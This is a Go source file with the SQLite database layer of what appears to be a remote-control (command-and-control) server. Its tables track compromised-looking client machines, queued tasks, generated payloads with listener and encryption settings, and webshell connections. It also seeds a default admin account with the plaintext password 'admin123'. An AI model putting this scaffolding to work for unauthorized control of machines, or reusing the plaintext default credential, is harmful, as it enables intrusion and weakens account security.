package main

import (
	"database/sql"
	"fmt"
	"sync"
	"time"

	_ "modernc.org/sqlite"
)

var (
	db   *sql.DB
	dbMu sync.Mutex
)

// initDB 初始化数据库连接并创建表结构（幂等，与 database.py init_db 对齐）
func initDB(dbPath string) error {
	var err error
	// timeout=30s, busy_timeout=30000ms, journal_mode=WAL, synchronous=NORMAL
	// 设置时区为 UTC+8（北京时间），使 CURRENT_TIMESTAMP / datetime('now') 返回本地时间
	connStr := fmt.Sprintf("%s?_pragma=busy_timeout(30000)&_pragma=journal_mode(WAL)&_pragma=synchronous(NORMAL)", dbPath)
	db, err = sql.Open("sqlite", connStr)
	if err != nil {
		return fmt.Errorf("打开数据库失败: %w", err)
	}
	db.SetMaxOpenConns(10)
	db.SetMaxIdleConns(5)
	db.SetConnMaxLifetime(0)

	// 设置 SQLite 时区为北京时间（UTC+8）
	// modernc.org/sqlite 使用 Go 的 time 包，通过 DSN 无法直接设置时区
	// 改为在 SQL 中统一使用 datetime('now', '+8 hours') 或在 Go 层格式化
	// 这里通过创建视图/触发器不现实，改为在写入时用 Go 的 time.Now().Format() 替代 CURRENT_TIMESTAMP

	if err := createTables(); err != nil {
		return fmt.Errorf("创建表失败: %w", err)
	}
	if err := migrateColumns(); err != nil {
		return fmt.Errorf("数据库迁移失败: %w", err)
	}
	if err := seedDefaults(); err != nil {
		return fmt.Errorf("初始化默认数据失败: %w", err)
	}
	return nil
}

// getBeijingLoc 返回北京时区（UTC+8）
func getBeijingLoc() *time.Location {
	loc, err := time.LoadLocation("Asia/Shanghai")
	if err != nil {
		// 回退到固定偏移 UTC+8
		loc = time.FixedZone("CST", 8*3600)
	}
	return loc
}

// nowLocal 返回当前北京时间（UTC+8）的 SQLite 时间格式字符串
// 用于替代 CURRENT_TIMESTAMP，确保所有时间字段存储的是本地时间而非 UTC
func nowLocal() string {
	return time.Now().In(getBeijingLoc()).Format("2006-01-02 15:04:05")
}

// createTables 创建所有表（CREATE TABLE IF NOT EXISTS，幂等）
func createTables() error {
	tables := []string{
		`CREATE TABLE IF NOT EXISTS users (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT UNIQUE NOT NULL,
			password TEXT NOT NULL,
			role TEXT DEFAULT 'admin',
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS clients (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			client_id TEXT UNIQUE NOT NULL,
			hostname TEXT,
			os TEXT,
			os_version TEXT,
			arch TEXT,
			username TEXT,
			ip TEXT,
			country TEXT,
			city TEXT,
			latitude REAL,
			longitude REAL,
			permission TEXT,
			group_name TEXT DEFAULT 'default',
			status TEXT DEFAULT 'online',
			last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			remark TEXT
		)`,
		`CREATE TABLE IF NOT EXISTS tasks (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			client_id TEXT NOT NULL,
			task_type TEXT NOT NULL,
			task_data TEXT,
			status TEXT DEFAULT 'pending',
			result TEXT,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			completed_at TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS logs (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			type TEXT NOT NULL,
			content TEXT,
			client_id TEXT,
			user_id INTEGER,
			ip TEXT,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS payloads (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			type TEXT NOT NULL,
			os TEXT,
			arch TEXT,
			format TEXT,
			encryption TEXT,
			icon TEXT,
			listen_host TEXT,
			listen_port INTEGER,
			protocol TEXT DEFAULT 'http',
			file_path TEXT,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS groups (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT UNIQUE NOT NULL,
			description TEXT,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE IF NOT EXISTS settings (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			key TEXT UNIQUE NOT NULL,
			value TEXT,
			updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)`,
	}
	for _, q := range tables {
		if _, err := db.Exec(q); err != nil {
			return fmt.Errorf("建表失败: %w", err)
		}
	}
	return nil
}

// migrateColumns 兼容老库：ALTER TABLE ADD COLUMN（与 database.py 对齐）
func migrateColumns() error {
	// clients 表新增字段
	clientCols := map[string]string{
		"session_id":            "TEXT",
		"session_state":         "TEXT DEFAULT 'active'",
		"session_started":       "TIMESTAMP",
		"interact_expires":      "TIMESTAMP",
		"client_type":           "TEXT DEFAULT 'agent'",
		"webshell_url":          "TEXT",
		"webshell_enc_algo":     "TEXT DEFAULT 'none'",
		"webshell_enc_password": "TEXT DEFAULT ''",
		"webshell_http_headers": "TEXT DEFAULT ''",
		"webshell_timeout":      "INTEGER DEFAULT 30",
		"webshell_proxy":        "TEXT DEFAULT ''",
	}
	if err := addColumnsIfNotExist("clients", clientCols); err != nil {
		return err
	}
	// payloads 表新增字段
	payloadCols := map[string]string{
		"delivery_token": "TEXT",
	}
	return addColumnsIfNotExist("payloads", payloadCols)
}

// addColumnsIfNotExist 检查表是否缺少字段，缺少则 ALTER TABLE ADD COLUMN
func addColumnsIfNotExist(table string, cols map[string]string) error {
	rows, err := db.Query(fmt.Sprintf("PRAGMA table_info(%s)", table))
	if err != nil {
		return err
	}
	defer rows.Close()
	existing := map[string]bool{}
	for rows.Next() {
		var cid int
		var name, typ string
		var notnull, pk int
		var dflt sql.NullString
		if err := rows.Scan(&cid, &name, &typ, &notnull, &dflt, &pk); err != nil {
			return err
		}
		existing[name] = true
	}
	for col, def := range cols {
		if !existing[col] {
			_, err := db.Exec(fmt.Sprintf("ALTER TABLE %s ADD COLUMN %s %s", table, col, def))
			if err != nil {
				return fmt.Errorf("添加字段 %s.%s 失败: %w", table, col, err)
			}
		}
	}
	return nil
}

// seedDefaults 初始化默认用户和分组（幂等）
func seedDefaults() error {
	var cnt int
	db.QueryRow("SELECT COUNT(*) FROM users WHERE username='admin'").Scan(&cnt)
	if cnt == 0 {
		_, err := db.Exec("INSERT INTO users (username, password, role) VALUES (?, ?, ?)", "admin", "admin123", "admin")
		if err != nil {
			return err
		}
	}
	db.QueryRow("SELECT COUNT(*) FROM groups WHERE name='default'").Scan(&cnt)
	if cnt == 0 {
		_, err := db.Exec("INSERT INTO groups (name, description) VALUES (?, ?)", "default", "默认分组")
		if err != nil {
			return err
		}
	}
	return nil
}

// ============ 查询辅助函数（与 database.py execute_query/query_one/query_all 对齐）============

// dbExec 执行写操作（INSERT/UPDATE/DELETE），返回 lastInsertId
// 注意: 函数名避免与 os/exec 包冲突
func dbExec(query string, args ...interface{}) (int64, error) {
	dbMu.Lock()
	defer dbMu.Unlock()
	for retry := 0; retry < 5; retry++ {
		res, err := db.Exec(query, args...)
		if err != nil {
			if isBusyErr(err) {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			return 0, err
		}
		id, _ := res.LastInsertId()
		return id, nil
	}
	return 0, fmt.Errorf("database is busy")
}

// queryOne 查询单行
func queryOne(query string, args ...interface{}) (map[string]interface{}, error) {
	rows, err := db.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	cols, _ := rows.Columns()
	if rows.Next() {
		vals := make([]interface{}, len(cols))
		ptrs := make([]interface{}, len(cols))
		for i := range vals {
			ptrs[i] = &vals[i]
		}
		if err := rows.Scan(ptrs...); err != nil {
			return nil, err
		}
		m := map[string]interface{}{}
		for i, col := range cols {
			m[col] = vals[i]
		}
		return m, nil
	}
	return nil, nil
}

// queryAll 查询多行
func queryAll(query string, args ...interface{}) ([]map[string]interface{}, error) {
	rows, err := db.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	cols, _ := rows.Columns()
	result := []map[string]interface{}{}
	for rows.Next() {
		vals := make([]interface{}, len(cols))
		ptrs := make([]interface{}, len(cols))
		for i := range vals {
			ptrs[i] = &vals[i]
		}
		if err := rows.Scan(ptrs...); err != nil {
			return nil, err
		}
		m := map[string]interface{}{}
		for i, col := range cols {
			m[col] = vals[i]
		}
		result = append(result, m)
	}
	return result, nil
}

// isBusyErr 检查是否为 SQLite busy 错误
func isBusyErr(err error) bool {
	return err != nil && (contains(err.Error(), "locked") || contains(err.Error(), "busy"))
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub || (len(sub) > 0 && stringContains(s, sub)))
}

func stringContains(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// addLog 添加操作日志（与 database.py add_log 对齐）
func addLog(logType, content string, clientID string, userID int64, ip string) {
	dbExec("INSERT INTO logs (type, content, client_id, user_id, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
		logType, content, clientID, userID, ip, nowLocal())
}

// getString 从 map 安全获取字符串
func getString(m map[string]interface{}, key string, def string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
		return fmt.Sprintf("%v", v)
	}
	return def
}

// getInt 从 map 安全获取 int64
func getInt(m map[string]interface{}, key string, def int64) int64 {
	if v, ok := m[key]; ok {
		switch n := v.(type) {
		case int64:
			return n
		case int:
			return int64(n)
		case float64:
			return int64(n)
		}
	}
	return def
}
